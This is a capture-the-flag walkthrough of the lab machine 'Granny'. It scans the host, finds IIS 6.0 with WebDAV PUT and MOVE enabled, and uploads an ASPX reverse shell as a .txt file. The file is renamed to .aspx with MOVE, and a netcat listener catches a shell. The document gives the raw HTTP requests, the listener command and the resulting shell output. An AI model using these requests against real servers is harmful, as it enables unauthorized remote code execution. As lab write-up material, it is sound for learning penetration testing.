# Granny

## Information Gathering
10.10.10.15

## Enumeration and Scanning
Scanning the only given host:<br>
```bash
# Nmap 7.92 scan initiated Mon Jan  3 23:49:56 2022 as: nmap -sC -sV -oN nmap/granny.nmap 10.10.10.15
Nmap scan report for 10.10.10.15
Host is up (0.030s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
|_http-title: Under Construction
| http-webdav-scan: 
|   Server Date: Tue, 04 Jan 2022 05:04:55 GMT
|   WebDAV type: Unknown
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_http-server-header: Microsoft-IIS/6.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan  3 23:50:08 2022 -- 1 IP address (1 host up) scanned in 12.15 seconds
```
When configuring a web server you really only ever want the GET and POST HTTP methods. Anything else is considered unecessary unless you REALLY need it.<br>
The HTTP method PUT allows for arbitrary file upload. I am potentially able to upload a reverse shell/web shell. Because this is a Microsoft IIS httpd 6.0 WebServer it is most likely that ASPX will be the file format I will use to gain remote code execution.<br>
I use <a href="https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx">this</a> web shell. I also use BurpSuite to create my custom HTTP header.
```bash
PUT /shell.aspx HTTP/1.1
Host: 10.10.10.15
Content-Length: 15968

[ASPX_SCRIPT_HERE]
```
This returns a 403 - Forbidden error code because I am not allowed to upload executable files directly. Fortunately, there is another HTTP header verb that can be used. MOVE allows for the renaming of files hosted on webserver. Uploading "shell.aspx" as "shell.txt" and then using MOVE to rename the file to the proper extension yields a reverse shell.<br>
Start the listener:<br>
```bash
nc -lnvp 8888
```
PUT the file:<br>
```bash
PUT /shell.txt HTTP/1.1
Host: 10.10.10.15
Content-Length: 15968

[ASPX_SCRIPT_HERE]
```
MOVE the file:<br>
```bash
MOVE /shell.txt HTTP/1.1
Host: 10.10.10.15
Destination: http://10.10.10.15/shell.aspx
```
And a reverse shell is caught!<br>
```bash
connect to [10.10.14.122] from (UNKNOWN) [10.10.10.15] 1031
Spawn Shell...
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```